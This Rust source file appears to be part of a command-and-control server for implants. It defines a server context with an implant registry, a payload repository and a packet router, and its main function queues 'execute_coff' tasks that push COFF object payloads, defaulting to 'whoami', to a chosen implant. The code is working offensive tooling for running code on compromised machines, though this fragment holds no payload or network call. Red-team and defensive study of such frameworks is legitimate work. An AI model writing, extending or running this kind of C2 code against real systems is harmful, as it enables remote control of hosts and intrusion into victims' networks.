use std::{io::Result as IoResult, sync::Arc};

use uuid::Uuid;

use super::{
    implants::{ImplantRecord, ImplantRegistry},
    payloads::{PayloadArtifact, PayloadRepository},
    router::PacketRouter,
    tasks::{TaskRecord, TaskService, TaskSpec},
};

#[derive(Clone)]
pub struct ServerContext {
    implants: ImplantRegistry,
    tasks: TaskService,
    payloads: PayloadRepository,
    router: PacketRouter,
}

impl ServerContext {
    pub fn new() -> Arc<Self> {
        Arc::new_cyclic(|weak| Self {
            implants: ImplantRegistry::new(),
            tasks: TaskService::new(),
            payloads: PayloadRepository::new(),
            router: PacketRouter::new(weak.clone()),
        })
    }

    pub fn router(&self) -> &PacketRouter {
        &self.router
    }

    pub fn implants(&self) -> &ImplantRegistry {
        &self.implants
    }

    pub fn tasks(&self) -> &TaskService {
        &self.tasks
    }

    pub async fn list_implants(&self) -> Vec<ImplantRecord> {
        self.implants.list().await
    }

    pub async fn implant_info(&self, clientid: &Uuid) -> Option<ImplantRecord> {
        self.implants.get(clientid).await
    }

    pub async fn queue_named_task(
        &self,
        clientid: Uuid,
        task_kind: &str,
        args: &[String],
    ) -> IoResult<TaskRecord> {
        let implant = self
            .implants
            .get(&clientid)
            .await
            .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "Unknown implant"))?;

        let spec = match task_kind {
            "execute_coff" | "coff" => self.build_execute_coff_task(args)?,
            _ => {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidInput,
                    format!("Unknown task kind: {task_kind}"),
                ))
            }
        };

        self.tasks.queue_task_for_implant(&implant, spec).await
    }

    pub async fn task_result(&self, task_id: &Uuid) -> Option<TaskRecord> {
        self.tasks.get(task_id).await
    }

    fn build_execute_coff_task(&self, args: &[String]) -> IoResult<TaskSpec> {
        let logical_name = args.first().map(String::as_str).unwrap_or("whoami");
        let artifact: PayloadArtifact = self.payloads.resolve(logical_name)?;

        Ok(TaskSpec::execute_coff(
            artifact.file_name,
            artifact.bytes,
            args.get(1).cloned().unwrap_or_else(|| "main".to_string()),
            if args.len() > 2 {
                args[2..].join(" ").into_bytes()
            } else {
                Vec::new()
            },
        ))
    }
}
